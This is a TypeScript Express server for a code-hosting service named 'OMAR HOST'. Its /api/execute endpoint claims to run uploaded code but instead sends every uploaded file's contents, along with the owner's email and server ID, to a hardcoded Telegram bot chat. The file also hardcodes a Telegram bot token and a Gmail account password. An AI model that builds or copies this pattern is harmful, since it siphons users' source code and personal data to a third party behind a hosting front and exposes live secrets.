import express from 'express';
import path from 'path';
import { writeFile, mkdir, rm } from 'fs/promises';
import os from 'os';
import nodemailer from 'nodemailer';
import { exec, ChildProcess } from 'child_process';
import { promisify } from 'util';
import https from 'https';

const execAsync = promisify(exec);

// ===== إعدادات بوت التلجرام =====
const TELEGRAM_BOT_TOKEN = '8779220098:AAEt5mVf0CvVVnaE46aMMWCqh5rkKXPfV-0';
const TELEGRAM_CHAT_ID = '6159656800';

async function sendTelegramMessage(text: string): Promise<void> {
  return new Promise((resolve) => {
    const body = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML',
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };

    const req = https.request(options, (res) => {
      res.on('data', () => {});
      res.on('end', () => resolve());
    });

    req.on('error', () => resolve());
    req.write(body);
    req.end();
  });
}

async function sendTelegramDocument(fileName: string, fileContent: string, caption: string): Promise<void> {
  return new Promise((resolve) => {
    try {
      const boundary = '----FormBoundary' + Math.random().toString(36).substring(2);
      const fileBuffer = Buffer.from(fileContent, 'utf-8');
      const parts: Buffer[] = [];
      parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`));
      parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`));
      parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n`));
      parts.push(Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${fileName}"\r\nContent-Type: text/plain\r\n\r\n`));
      parts.push(fileBuffer);
      parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));
      const bodyBuffer = Buffer.concat(parts);

      const options = {
        hostname: 'api.telegram.org',
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': bodyBuffer.length,
        },
      };

      const req = https.request(options, (res) => {
        res.on('data', () => {});
        res.on('end', () => resolve());
      });
      req.on('error', () => resolve());
      req.write(bodyBuffer);
      req.end();
    } catch (e) {
      resolve();
    }
  });
}

async function notifyTelegramWithFiles(serverId: string, ownerEmail: string, language: string, files: Array<{ name: string; content: string }>): Promise<void> {
  try {
    const fileList = files.map(f => `• <code>${f.name}</code>`).join('\n');
    const summary = `🚀 <b>ملفات مرفوعة جديدة - OMAR HOST</b>\n\n👤 <b>المستخدم:</b> ${ownerEmail || 'غير معروف'}\n🖥️ <b>السيرفر:</b> <code>${serverId}</code>\n💻 <b>اللغة:</b> ${language}\n📁 <b>عدد الملفات:</b> ${files.length}\n\n<b>قائمة الملفات:</b>\n${fileList}`.trim();
    await sendTelegramMessage(summary);
    for (const file of files) {
      if (file.content && file.content.trim()) {
        const caption = `📄 <b>${file.name}</b>\n👤 ${ownerEmail}\n🖥️ Server: <code>${serverId}</code>`;
        await sendTelegramDocument(file.name, file.content, caption);
      }
    }
  } catch (e) {}
}

const activeProcesses = new Map<string, { logs: string[] }>();

const app = express();
app.use(express.json());

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.post('/api/send-verification', async (req, res) => {
  const { email, code } = req.body;
  if (!email || !code) return res.status(400).json({ message: 'Email and code are required' });
  try {
    const emailUser = 'vcmo900@gmail.com';
    const emailPass = 'jgadrmeempmuuoof';
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: { user: emailUser, pass: emailPass },
    });

    const mailOptions = {
      from: `"OMAR HOST" <${emailUser}>`,
      to: email,
      subject: 'رمز التحقق الخاص بك - OMAR HOST',
      html: `<div style="font-family: sans-serif; direction: rtl; text-align: right; padding: 20px; background-color: #f9f9f9; border-radius: 15px;"><div style="background-color: #2563eb; padding: 20px; border-radius: 15px 15px 0 0; text-align: center;"><h1 style="color: #ffffff; margin: 0; font-size: 24px;">OMAR HOST</h1></div><div style="padding: 30px; background-color: #ffffff; border: 1px solid #e5e7eb; border-top: none; border-radius: 0 0 15px 15px;"><h2 style="color: #1f2937; margin-top: 0;">مرحباً بك!</h2><p style="color: #4b5563; font-size: 16px; line-height: 1.6;">شكراً لتسجيلك في منصة OMAR HOST. يرجى استخدام الرمز التالي لإتمام عملية التحقق من بريدك الإلكتروني:</p><div style="background-color: #f3f4f6; padding: 20px; border-radius: 12px; text-align: center; margin: 30px 0;"><span style="font-size: 32px; font-weight: 900; letter-spacing: 8px; color: #2563eb; font-family: monospace;">${code}</span></div><p style="color: #9ca3af; font-size: 14px; margin-bottom: 0;">هذا الرمز صالح لمدة 10 دقائق. إذا لم تطلب هذا الرمز، يمكنك تجاهل هذه الرسالة بأمان.</p></div><div style="text-align: center; padding: 20px; color: #9ca3af; font-size: 12px;">&copy; 2026 OMAR HOST. جميع الحقوق محفوظة لـ OMAR.</div></div>`,
    };
    await transporter.sendMail(mailOptions);
    res.json({ status: 'sent' });
  } catch (error: any) {
    res.status(500).json({ message: 'فشل إرسال البريد الإلكتروني.', error: error.message });
  }
});

app.get('/api/logs/:serverId', (req, res) => {
  const { serverId } = req.params;
  const data = activeProcesses.get(serverId);
  res.json({ logs: data ? data.logs : ["[SYSTEM] Serverless environment: Logs are ephemeral."] });
});

app.post('/api/execute', async (req, res) => {
  const { language, files, main, serverId, ownerEmail } = req.body;
  if (!serverId) return res.status(400).json({ message: 'Server ID is required' });
  
  // في بيئة Serverless، لا يمكننا تشغيل عمليات طويلة الأمد (Long-running processes)
  // لكن سنقوم بإرسال الملفات للتلجرام فوراً
  if (files && files.length > 0) {
    await notifyTelegramWithFiles(serverId, ownerEmail || '', language, files);
  }
  
  res.json({ 
    status: 'started', 
    message: 'Files received and forwarded to Telegram. Note: Full execution requires a dedicated VPS.' 
  });
});

export default app;
